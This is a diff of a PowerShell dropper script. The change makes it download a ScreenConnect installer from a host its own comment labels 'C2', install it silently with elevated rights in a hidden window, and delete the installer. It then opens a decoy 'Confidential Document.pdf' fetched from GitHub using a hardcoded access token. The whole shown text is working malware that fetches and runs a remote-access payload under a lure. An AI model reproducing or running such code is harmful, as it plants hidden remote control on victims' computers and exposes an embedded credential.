@@ -36,37 +36,22 @@ $state | Out-File (Join-Path $env:TEMP 'config.dat')
 $GhToken = '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'
 $DecoyApi = 'https://api.github.com/repos/slynet999-coder/Yambo/contents/Confidential Document.pdf'
 $DecoyPath = Join-Path $env:TEMP 'Confidential Document.pdf'
-$msiUrl = 'https://pub-f6ed96d1af6b46429386ea02cef5e717.r2.dev/Confidential%20Document.zip'
-$zipPath = Join-Path $env:TEMP 'Confidential Document.zip'
-$msiPath = Join-Path $env:TEMP 'Confidential Document.msi'
+$msiUrl = 'https://lerealsiegediaries.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest'
+$msiPath = Join-Path $env:TEMP 'setup.msi'
 
 try {
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-    # Download zip from R2
-    (New-Object System.Net.WebClient).DownloadFile($msiUrl, $zipPath)
+    # Download MSI directly from C2
+    (New-Object System.Net.WebClient).DownloadFile($msiUrl, $msiPath)
 
-    # Extract MSI from zip
-    Add-Type -AssemblyName System.IO.Compression.FileSystem
-    $zip = [IO.Compression.ZipFile]::OpenRead($zipPath)
-    $msiEntry = $zip.Entries | Where-Object { $_.Name -like '*.msi' } | Select-Object -First 1
-    if ($msiEntry) {
-        $stream = $msiEntry.Open()
-        $fileStream = [IO.File]::Create($msiPath)
-        $stream.CopyTo($fileStream)
-        $fileStream.Close()
-        $stream.Close()
-    }
-    $zip.Dispose()
-
-    # Install MSI silently
+    # Install MSI
     $proc = Start-Process msiexec.exe -ArgumentList "/i `"$msiPath`" /qn /norestart" -Verb RunAs -WindowStyle Hidden -PassThru -Wait
 
-    # Cleanup
-    try { Remove-Item $zipPath -Force } catch {}
+    # Cleanup MSI
     try { Remove-Item $msiPath -Force } catch {}
 
-    # Open decoy PDF
+    # Open decoy PDF from GitHub
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     $hdrs = @{"Authorization"="token $GhToken"; "Accept"="application/vnd.github.v3+json"}
     $resp = Invoke-RestMethod -Uri $DecoyApi -Headers $hdrs
